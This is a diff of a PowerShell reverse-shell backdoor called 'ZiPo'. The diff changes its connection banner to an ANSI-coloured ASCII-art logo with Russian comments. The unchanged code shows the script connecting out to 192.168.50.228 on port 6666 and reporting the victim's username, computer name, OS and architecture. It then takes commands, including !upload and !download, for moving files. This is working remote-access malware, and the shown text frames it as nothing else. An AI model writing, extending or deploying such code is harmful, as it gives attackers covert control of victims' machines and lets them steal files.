@@ -1,17 +1,3 @@
-$msg = @"
-[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
-    ________  .__              __________                .___           
-    \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
-     |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \\
-     |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
-    /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
-            \/        \/\/                                      \/    \/ 
-
-OS: $([System.Environment]::OSVersion.VersionString)
-Architecture: $env:PROCESSOR_ARCHITECTURE
----------------------------------------------------
-"@
-
 function Connect-ZiPo {
     $srv = "192.168.50.228"
     $port = 6666
@@ -43,21 +29,34 @@ function Connect-ZiPo {
             $stream = $tcp.GetStream()
             [byte[]]$buffer = 0..65535 | % { 0 }
 
-            # Приветствие
-            $msg = "`n[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME`n"
-            $bytes = [Text.Encoding]::ASCII.GetBytes($msg)
-            $stream.Write($bytes, 0, $bytes.Length)
+            # ANSI баннер + системная инфа
+            $esc = [char]27
+            $banner = @"
+${esc}[31m
+    ________  .__              __________                .___           
+    \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
+     |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \\
+     |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
+    /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
+            \/        \/\/                                      \/    \/ 
+${esc}[32m
+[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
+OS: $([System.Environment]::OSVersion.VersionString)
+Architecture: $env:PROCESSOR_ARCHITECTURE
+---------------------------------------------------
+${esc}[0m
+"@
+            $bbytes = [Text.Encoding]::ASCII.GetBytes($banner)
+            $stream.Write($bbytes, 0, $bbytes.Length)
 
             while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                 $cmd = ([Text.Encoding]::ASCII).GetString($buffer, 0, $i).Trim()
                 Write-Log "CMD: $cmd"
 
-                # Upload handler
                 if ($cmd.StartsWith("!upload")) {
                     $path = $cmd.Substring(7).Trim()
                     $response = Upload-File $path
                 }
-                # Download handler
                 elseif ($cmd.StartsWith("!download")) {
                     $parts = $cmd.Split("::")
                     if ($parts.Length -eq 3) {
